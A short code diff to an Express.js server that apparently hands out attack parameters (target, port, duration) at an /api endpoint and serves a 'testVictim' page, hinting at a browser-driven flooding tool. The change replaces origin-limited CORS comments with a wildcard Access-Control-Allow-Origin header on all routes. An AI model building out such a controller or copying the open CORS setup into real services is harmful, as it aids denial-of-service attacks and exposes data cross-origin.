@@ -15,8 +15,13 @@ var target = "0.0.0.0";
 var port = "80";
 var time = "5";
 
+app.all('/*', function(req, res, next) {
+    res.header('Access-Control-Allow-Origin', '*');
+    res.header('Access-Control-Allow-Headers', 'Content-Type,X-Requested-With');
+    next();
+});
+
 app.get('/api', function (req, res) {
-	//res.append('Access-Control-Allow-Origin','http://127.0.0.1:3000/');
 	res.send({'status': status,
 	'target': target,
 	'port': port,
@@ -24,7 +29,6 @@ app.get('/api', function (req, res) {
 });
 
 app.get('/ui', function (req, res) {
-	//res.append('Access-Control-Allow-Origin','http://127.0.0.1:3000/');
 	res.sendFile(__dirname + "/static/site/form.html");
 });
 
@@ -33,7 +37,6 @@ app.get('/', function (req, res) {
 });
 
 app.get('/test', function (req, res) {
-	//res.append('Access-Control-Allow-Origin','http://127.0.0.1:3000/');
 	res.sendFile(__dirname + "/static/testVictim.html");
 });
 
